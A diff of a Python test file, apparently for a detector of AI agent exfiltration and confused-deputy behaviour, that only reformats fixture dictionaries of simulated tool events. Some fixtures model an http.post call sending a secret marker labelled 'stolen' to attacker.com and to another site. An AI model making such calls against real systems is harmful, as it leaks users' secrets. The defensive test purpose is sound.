@@ -212,7 +212,10 @@ class TestExfiltration:
             "tool_events": [
                 {
                     "name": "http.post",
-                    "args": {"url": "https://attacker.com", "data": f"stolen:{SECRET_MARKER}"},
+                    "args": {
+                        "url": "https://attacker.com",
+                        "data": f"stolen:{SECRET_MARKER}",
+                    },
                     "ok": True,
                     "side_effect": "SHARE",
                     "source": "tool",
@@ -258,7 +261,10 @@ class TestExfiltration:
                 },
                 {
                     "name": "http.post",
-                    "args": {"url": "https://site2.com", "data": f"prefix{SECRET_MARKER}"},
+                    "args": {
+                        "url": "https://site2.com",
+                        "data": f"prefix{SECRET_MARKER}",
+                    },
                     "ok": True,
                     "side_effect": "SHARE",
                     "source": "tool",
@@ -364,7 +370,11 @@ class TestConfusedDeputy:
             "tool_events": [
                 {
                     "name": "email.send",
-                    "args": {"to": "test@example.com", "subject": "test", "body": "content"},
+                    "args": {
+                        "to": "test@example.com",
+                        "subject": "test",
+                        "body": "content",
+                    },
                     "ok": True,
                     "side_effect": "SHARE",
                     "source": "tool",
@@ -384,7 +394,11 @@ class TestConfusedDeputy:
             "tool_events": [
                 {
                     "name": "email.send",
-                    "args": {"to": "test@example.com", "subject": "test", "body": "content"},
+                    "args": {
+                        "to": "test@example.com",
+                        "subject": "test",
+                        "body": "content",
+                    },
                     "ok": True,
                     "side_effect": "SHARE",
                     "source": "tool",
@@ -403,7 +417,11 @@ class TestConfusedDeputy:
             "tool_events": [
                 {
                     "name": "email.send",
-                    "args": {"to": "test@example.com", "subject": "test", "body": "content"},
+                    "args": {
+                        "to": "test@example.com",
+                        "subject": "test",
+                        "body": "content",
+                    },
                     "ok": True,
                     "side_effect": "SHARE",
                     "source": "tool",
@@ -541,7 +559,12 @@ class TestEdgeCases:
         """Test that missing args field is handled gracefully."""
         trace = {
             "tool_events": [
-                {"name": "http.post", "ok": True, "side_effect": "SHARE", "source": "tool"}
+                {
+                    "name": "http.post",
+                    "ok": True,
+                    "side_effect": "SHARE",
+                    "source": "tool",
+                }
             ],
             "user_messages": ["test"],
         }
